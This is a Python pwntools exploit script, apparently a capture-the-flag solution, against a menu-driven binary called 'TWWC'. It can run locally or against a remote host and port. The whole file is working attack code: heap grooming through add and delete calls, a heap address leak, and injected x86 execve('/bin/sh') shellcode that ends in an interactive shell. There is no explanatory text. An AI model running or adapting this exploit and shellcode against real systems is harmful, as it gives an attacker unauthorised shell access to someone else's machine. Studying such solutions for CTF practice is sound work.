#!/usr/bin/env python

from pwn import *
import sys

def add_expr(data):
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(data)
    r.recvuntil('> ')

def del_expr(idx):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.recvuntil('> ')

def execute(idx, note = False, nsize = 0):
    r.send('3')
    r.sendafter(': ', str(idx))
    r.recvuntil('result is: ', timeout=.5)
    data = r.recvuntil('!', drop=True, timeout=.5)
    if note:
        r.sendline('Y')
        r.sendafter(': ', str(nsize))
        r.sendafter(': ', note)
    else:
        r.sendline('N')
    r.recvuntil('> ', timeout=.5)
    return data

def exploit(r):

    shellcode = (
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
        "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
    )

    sc = asm('''
                push edx
                pop eax
                push edx
                pop ecx
                inc eax
                inc eax
                inc eax
                inc eax
                inc eax
                inc eax
                inc eax
                inc eax
                inc eax
                inc eax
                inc eax
                push ecx
                pop esi
                push ecx
                push   0x68732f2f
                push   0x6e69622f
    ''')


    add_expr('1 - 1')
    add_expr('2 + 0')

    payload  = p32(0x44444444)
    payload += sc
    payload += '\x75\x2e'
    payload += p32(0x55555555)
    execute(1, payload, 0x46)

    add_expr('-%d + %d' % ((-0x80cde389 & 0xffffffff), 255 ))

    del_expr(0)
    del_expr(1)

    heap = int(execute(1)) & 0xffffffff
    log.info("Heap base: " + hex(heap)) 

    del_expr(0)

    add_expr('%s + 4' % ((heap & 0xffffffff)+0x24) )
    add_expr('0 + 25')

    payload  = p32(0)
    payload += p32(0x20)
    payload += p32(0)
    payload += 'BBBB'
    execute(4, payload, 0x14)

    add_expr('%d + 123'  % ((heap & 0xffffffff)+0x3c))

    pause()
    execute(4)

    r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./TWWC'])
        print util.proc.pidof(r)
        pause()
        exploit(r)